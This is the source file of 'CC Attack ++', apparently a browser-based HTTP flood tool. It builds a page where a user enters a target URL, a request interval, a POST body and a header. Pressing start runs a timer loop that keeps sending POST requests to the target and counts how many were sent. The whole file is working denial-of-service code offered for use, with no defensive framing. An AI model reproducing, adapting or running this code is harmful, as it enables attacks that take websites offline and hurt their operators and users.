/*
* [CC Attack ++] Power by Mason
* Version : V1.5.1 (BUILD_2023_2_17_21:10)
* Email : admin@almondnet.cn
* Github : https://github.com/MasonDye/CCAttack++
*/

// DON'T CHANGE THIS!
const version = "V1.5.1 (BUILD_2023_2_17_21:10)";

//*-*-*-*-*-*-* Config *-*-*-*-*-*

// Massage import
import { en_US } from './lang/en_US.js'; //By default you should not delete it
import { zh_CN } from './lang/zh_CN.js'; //By default you should not delete it

// Massage
// Support language: main:English(en_US),Chinese(zh_CN)
const Massage = en_US;

//*-*-*-*-*-*-* Config *-*-*-*-*-*

console.log("[CC Attack ++] " + Massage.m_powerBy + " Mason\n" + Massage.m_version + ":" + version + "\nGithub: https://github.com/MasonDye/CCAttack++");
loadBody_span.innerHTML = ("<div align='center'><br><img width='7%' src='./img/CC Attack++.svg'><br><h1>CC Attack ++</h1><br><p>" + Massage.m_attackNumber + ":<span id='attackNumber_span'></span></p><br><input type='text' name='inputURL' placeholder='" + Massage.m_URL + "' style='margin-right: 10px' /><br><input type='text' name='postSpeed' placeholder='" + Massage.m_postSpeed + "' style='margin-right: 10px' /><br><input type='text' name='postContent' placeholder='" + Massage.m_postContent + "' style='margin-right: 10px' /><br><input type='text' name='postHeader' placeholder='" + Massage.m_postHeader + "' style='margin-right: 10px' /><br><input type='button' name='stButton' value='" + Massage.m_start + "' /><br><p>" + Massage.m_version + ":" + version + "</p></div>");
let timer = null;
let attackNumber = "0";
attackNumber_span.innerHTML = attackNumber;
const input = document.querySelector('input[name="inputURL"]');
const postSpeed = document.querySelector('input[name="postSpeed"]');
const postContent = document.querySelector('input[name="postContent"]');
const postHeader = document.querySelector('input[name="postHeader"]');
const button = document.querySelector('input[name="stButton"]');
button.addEventListener('click', function () {
    const url = input.value;
    if (!url) return alert(Massage.m_notURL);
    if (!url.startsWith('http')) return alert(Massage.m_notHttp);
    if (this.value === Massage.m_start) {
        this.value = Massage.m_stop;
        timer = setInterval(() => {
            attackNumber++
            attackNumber_span.innerHTML = attackNumber;
            const cc = new XMLHttpRequest();
            cc.open('POST', url, true);
            cc.setRequestHeader('Content-Type', postHeader.value);
            cc.send(postContent.value);
        }, postSpeed.value);
    } else {
        this.value = Massage.m_start;
        clearInterval(timer);
    }
});
